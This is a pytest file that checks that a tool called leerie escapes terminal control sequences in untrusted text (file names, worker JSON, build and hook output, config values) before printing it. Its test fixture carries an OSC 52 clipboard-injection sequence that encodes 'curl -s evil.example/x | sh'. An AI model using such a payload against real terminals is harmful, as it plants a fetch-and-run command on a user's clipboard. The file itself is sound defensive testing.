"""No text leerie did not write reaches the operator's terminal as a control
sequence (DESIGN §6; review round 30 isolation T1). A repository's file name
or a worker's JSON string holding an OSC 52 sequence (set the clipboard), a
CSI, a C1 byte or a bidi override reached the terminal byte for byte through
`log()`, `die()`, the question UI and the launcher's relay of container
output. Here each of those paths is driven and its output read."""
from __future__ import annotations

import base64
import importlib.util
import io
import json
import os
import subprocess
import sys
from pathlib import Path

import pytest

from tests.conftest import BUILDCTL_STUB, REPO_ROOT

FILTER = REPO_ROOT / "scripts" / "terminal-text.py"
OSC52 = ("\x1b]52;c;" + base64.b64encode(b"curl -s evil.example/x | sh\n")
         .decode() + "\x07")
# ESC (OSC 52, CSI), C1 CSI, a bidi override, a line separator, BEL, CR.
HOSTILE = (OSC52 + "\x1b[2J\x9b31m\u202edesrever\u2028\x07\r")
CONTROLS = ("\x1b", "\x07", "\x9b", "\u202e", "\u2028", "\r")


def _filter_module():
    spec = importlib.util.spec_from_file_location("terminal_text", FILTER)
    m = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(m)
    return m


def _clean(text: str) -> bool:
    return not any(c in text for c in CONTROLS)


def test_terminal_text_escapes_every_control_and_keeps_lines(leerie):
    got = leerie._terminal_text("a\tb\n" + HOSTILE + "\udc9b")
    assert _clean(got), repr(got)
    assert got.startswith("a\tb\n\\x1b]52;c;")
    assert "\\x9b31m" in got and "\\u202e" in got and "\\u2028" in got
    assert got.endswith("\\x07\\x0d\\x9b")
    assert leerie._terminal_text(got) == got


def test_the_launchers_filter_is_the_same_rule(leerie):
    m = _filter_module()
    corpus = "".join(chr(c) for c in range(0x3000)) + "\udc80\udcff\ud800"
    assert m.text(corpus) == leerie._terminal_text(corpus)


def test_the_filter_relays_bytes_split_anywhere(tmp_path):
    """The relay reads chunks: a UTF-8 character split across reads is still
    one character, a byte that is not UTF-8 is escaped, and an OSC 52
    sequence arrives as text."""
    data = ("ok é " + HOSTILE + " end\n").encode() + b"\x9b\xff\n"
    r = subprocess.run(
        [sys.executable, "-I", "-S", "-c",
         "import os,subprocess,sys;"
         "p=subprocess.Popen([sys.executable,'-I','-S',sys.argv[1]],"
         "stdin=subprocess.PIPE,stdout=subprocess.PIPE);"
         "d=sys.stdin.buffer.read()\n"
         "for i in range(len(d)):\n"
         "    p.stdin.write(d[i:i+1]); p.stdin.flush()\n"
         "p.stdin.close(); sys.stdout.buffer.write(p.stdout.read()); "
         "sys.exit(p.wait())", str(FILTER)],
        input=data, capture_output=True, timeout=60)
    assert r.returncode == 0, r.stderr
    out = r.stdout.decode("utf-8")
    assert _clean(out), repr(out)
    assert out.startswith("ok é \\x1b]52;c;")
    assert out.endswith(" end\n\\x9b\\xff\n")


def test_log_and_die_escape_what_they_print(leerie, capsys):
    leerie.log("  acceptance set 1 discarded: " + HOSTILE)
    with pytest.raises(SystemExit):
        leerie.die("a worker said: " + HOSTILE)
    out, err = capsys.readouterr()
    assert "discarded: \\x1b]52;c;" in out and _clean(out), repr(out)
    assert "said: \\x1b]52;c;" in err and _clean(err), repr(err)


def test_a_workers_json_string_reaches_the_question_ui_as_text(leerie,
                                                               monkeypatch):
    """A JSON schema string admits `\\u001b`: the classifier's question,
    printed by the question UI through `main()`'s streams."""
    question = json.loads(json.dumps({"question": "Which? " + HOSTILE}))
    out = io.StringIO()
    monkeypatch.setattr(sys, "stdout", out)
    monkeypatch.setattr(sys, "stderr", io.StringIO())
    leerie._guard_terminal_streams()
    print(f"\n? {question['question']}")
    assert isinstance(sys.stdout, leerie._TerminalStream)
    assert "Which? \\x1b]52;c;" in out.getvalue()
    assert _clean(out.getvalue()), repr(out.getvalue())


def test_the_run_log_copy_is_escaped_too(leerie, tmp_path):
    term, logf = io.StringIO(), (tmp_path / "orchestrator.log").open("w")
    tee = leerie._TeeStream(term, logf)
    tee.write("x " + HOSTILE + "\n")
    logf.close()
    for text in (term.getvalue(),
                 (tmp_path / "orchestrator.log").read_text()):
        assert "x \\x1b]52;c;" in text and _clean(text), repr(text)


def test_a_repositorys_file_name_reaches_the_entry_message_as_text(
        leerie, tmp_path, monkeypatch, capsys):
    """The reviewer's proof: a file the repository image puts beneath
    `/home/leerie` named with an OSC 52 sequence, through
    `_require_worker_view`'s `die`."""
    root, home = tmp_path / "root", tmp_path / "home"
    (root / "home" / "leerie").mkdir(parents=True)
    home.mkdir()
    (root / "home" / "leerie" / ("x" + OSC52)).write_text("")
    monkeypatch.delenv(leerie.REPO_IMAGE_ENV, raising=False)
    monkeypatch.setattr(leerie, "_worker_root", lambda: str(root))
    orig = leerie._worker_home_extras
    monkeypatch.setattr(leerie, "_worker_home_extras",
                        lambda wr: orig(wr, home=home))
    with pytest.raises(SystemExit):
        leerie._require_worker_view()
    err = capsys.readouterr().err
    assert "x\\x1b]52;c;" in err and _clean(err), repr(err)


def test_the_launcher_relays_through_the_filter():
    """Every place the launcher hands a container's or a machine's output
    to the terminal goes through `_terminal_relay` (the filter's behaviour
    is the tests above)."""
    launcher = (REPO_ROOT / "leerie").read_text()
    lib = (REPO_ROOT / "scripts" / "remote" / "lib.sh").read_text()
    ssm = (REPO_ROOT / "scripts" / "remote" / "ec2-ssm.sh").read_text()
    log_sh = (REPO_ROOT / "scripts" / "remote" / "_log.sh").read_text()
    assert "scripts/terminal-text.py" in log_sh
    assert launcher.count('tail -n +1 -f "$_run_log" 2>/dev/null | '
                          '_terminal_relay') == 2
    assert '_terminal_relay < "$_launch_stderr" >&2' in launcher
    assert 'cat "$_launch_stderr"' not in launcher
    assert launcher.count("| _terminal_relay") >= 4
    assert lib.count("| _terminal_relay") == 3
    assert "ec2_attach | _terminal_relay" in ssm


@pytest.mark.skipif(not sys.platform.startswith("linux"), reason="reads /proc")
def test_the_launcher_relays_a_containers_output_as_text(tmp_path):
    """The real launcher, piped (its output a file), against a stub
    `nerdctl` whose container prints the sequences: the operator sees
    their escapes."""
    from tests.launcher_stub_run import make_world, run_to_end
    w = make_world(tmp_path)
    rc, out = run_to_end(w, ["--no-push", "fix it"],
                         env_extra={"STUB_RUN_PRINT": "said " + HOSTILE})
    assert rc == 0, out
    assert "said \\x1b]52;c;" in out, out
    assert _clean(out), repr(out)


# --- review round 31: every print of text leerie did not write --------------
#
# The repository image's build output (local `nerdctl build`, Fly's
# `build-push.sh`), `leerie config`'s values and host-finalize's hook and
# worker text reached the terminal raw. Each is driven here with the real
# function and a producer built from shell builtins.

LOG_SH = REPO_ROOT / "scripts" / "remote" / "_log.sh"
LAUNCHER_TEXT = (REPO_ROOT / "leerie").read_text()
FRONTEND_SH = REPO_ROOT / "scripts" / "dockerfile-frontend.sh"


def _launcher_fn(name: str) -> str:
    s = LAUNCHER_TEXT.index(f"\n{name}() {{\n") + 1
    return LAUNCHER_TEXT[s:LAUNCHER_TEXT.index("\n}\n", s) + 3]


def _bash(script: str, env: dict | None = None,
          cwd: str = "/") -> subprocess.CompletedProcess:
    return subprocess.run(
        ["/bin/bash", "-c", "set -euo pipefail\n" + script], cwd=cwd,
        env={"PATH": "/usr/bin:/bin", "H": HOSTILE, **(env or {})},
        capture_output=True, text=True, errors="replace", timeout=60)


# Both relays below run their producer through the launcher's _build_job.
_BUILD_JOB = ('_BUILD_JOB_PID=""\n' + _launcher_fn("_build_job")
              + _launcher_fn("_build_job_end"))


@pytest.mark.parametrize("rc", [0, 1, 2])
def test_the_repository_image_build_reaches_the_terminal_as_text(tmp_path,
                                                                 rc):
    """`build_repo_image`: both builds' output (stdout and stderr) is
    relayed, and each build's own status still decides (RC=1 fails the
    repository's build, RC=2 leerie's)."""
    (tmp_path / "repo").mkdir()
    (tmp_path / "repo" / "Dockerfile").write_text("FROM x\n")
    r = _bash(f". {LOG_SH}\n"
              'remote_log() { printf "%s\\n" "$*" >&2; }\n'
              'nerdctl() { printf "out %s\\n" "$H"; '
              'printf "err %s\\n" "$H" >&2; N=0; '
              'read -r N < "$CNT" || :; N=$((N + 1)); '
              'printf "%s\\n" "$N" > "$CNT"; [ "$N" != "$RC" ]; }\n'
              "_repo_build_prepare() { :; }\n_check_repo_image() { :; }\n"
              "_repo_layout_digest() { echo sha256:x; }\n"
              "_repo_image_wrap() { :; }\n"
              '_repo_build_fail() { printf "FAIL %s\\n" "$*" >&2; exit 7; }\n'
              f"CNT={tmp_path}/n _REPO_BUILD_DIR={tmp_path} "
              "_REPO_BUILD_CTX=/nonexistent IMAGE_TAG=base\n"
              f". {FRONTEND_SH}\n" + BUILDCTL_STUB + _BUILD_JOB
              + _launcher_fn("build_repo_image")
              + "build_repo_image tag\necho BUILT\n", {"RC": str(rc)})
    assert "out \\x1b]52;c;" in r.stderr and "err \\x1b]52;c;" in r.stderr
    assert _clean(r.stdout + r.stderr), repr(r.stderr)
    if rc:
        assert r.returncode == 7 and "FAIL per-repo" in r.stderr, r.stderr
    else:
        assert r.returncode == 0 and r.stdout == "BUILT\n", r.stderr


@pytest.mark.parametrize("rc", [0, 1])
def test_the_fly_build_and_push_reaches_the_terminal_as_text(tmp_path, rc):
    """`_fly_push`: build-push.sh's output (the remote builder's log of the
    repository's Dockerfile steps) is relayed, on the script's status."""
    bp = tmp_path / "build-push.sh"
    bp.write_text('#!/bin/bash\nprintf "out %s\\n" "$H"\n'
                  'printf "err %s\\n" "$H" >&2\n'
                  'while [ $# -gt 0 ]; do\n'
                  '  [ "$1" = --digest-file ] && printf "sha256:%064d\\n" 0 > "$2"\n'
                  '  shift\ndone\nexit "$RC"\n')
    bp.chmod(0o755)
    r = _bash(f". {LOG_SH}\n"
              'remote_log() { printf "%s\\n" "$*" >&2; }\n'
              + _BUILD_JOB
              + _launcher_fn("_fly_digest_ok") + _launcher_fn("_fly_push")
              + f'if _fly_push {bp} {tmp_path / "cache"} reg/app:t --push; '
              'then echo "PUSHED $_FLY_PUSHED"; else echo FAILED; fi\n',
              {"RC": str(rc)})
    assert r.returncode == 0, r.stderr
    assert "out \\x1b]52;c;" in r.stderr and "err \\x1b]52;c;" in r.stderr
    assert _clean(r.stdout + r.stderr), repr(r.stderr)
    assert r.stdout == ("FAILED\n" if rc else f"PUSHED sha256:{'0' * 64}\n")


def test_leerie_config_prints_the_repositorys_values_as_text(tmp_path):
    """The real launcher's `config` verb, on a checkout whose
    `.leerie/config.toml` and `leerie.toml` carry the sequences."""
    repo = tmp_path / "repo"
    (repo / ".leerie").mkdir(parents=True)
    subprocess.run(["git", "init", "-q", str(repo)], check=True)
    esc = HOSTILE.replace("\\", "").replace('"', "")
    (repo / ".leerie" / "config.toml").write_text(
        f'build = "make {esc}"\ntest_scoped = "t {esc}"\n')
    (repo / "leerie.toml").write_text(f'model = "x{esc}"\n')
    home = tmp_path / "home"
    home.mkdir()
    r = subprocess.run(
        ["/bin/bash", str(REPO_ROOT / "leerie"), "config"], cwd=repo,
        env={"PATH": os.environ["PATH"], "HOME": str(home)},
        capture_output=True, text=True, errors="replace", timeout=120)
    assert r.returncode == 0, r.stderr
    assert "make \\x1b]52;c;" in r.stdout and "t \\x1b]52;c;" in r.stdout
    assert "model = \"x\\x1b]52;c;" in r.stdout, r.stdout
    assert _clean(r.stdout + r.stderr), repr(r.stdout)


def _origin_repo(tmp_path: Path) -> Path:
    origin, work = tmp_path / "origin.git", tmp_path / "work"
    for args in (["init", "-q", "--bare", str(origin)],
                 ["init", "-q", "-b", "main", str(work)]):
        subprocess.run(["git", *args], check=True)
    (work / "a").write_text("a\n")
    for args in (["add", "a"], ["-c", "user.email=t@t", "-c", "user.name=t",
                                "commit", "-qm", "i"],
                 ["remote", "add", "origin", str(origin)],
                 ["push", "-q", "--no-verify", "origin", "main"]):
        subprocess.run(["git", "-C", str(work), *args], check=True,
                       capture_output=True)
    hook = work / ".git" / "hooks" / "pre-push"
    hook.write_text('#!/bin/bash\nprintf "lint: src/%s.ts\\n" "$H"\n'
                    'printf "lint: out %s\\n" "$H" >&2\nexit 1\n')
    hook.chmod(0o755)
    return work


def test_a_pre_push_hooks_output_reaches_the_terminal_as_text(tmp_path):
    """`host_prepush_preflight` prints the hook's complaint; the hook is
    the repository's."""
    work = _origin_repo(tmp_path)
    r = _bash(f'. {REPO_ROOT / "scripts" / "host-finalize.sh"}\n'
              f"host_prepush_preflight {work} main || echo rc=$?\n")
    assert "rc=1" in r.stdout, (r.stdout, r.stderr)
    assert "lint: src/\\x1b]52;c;" in r.stderr, r.stderr
    assert _clean(r.stderr), repr(r.stderr)
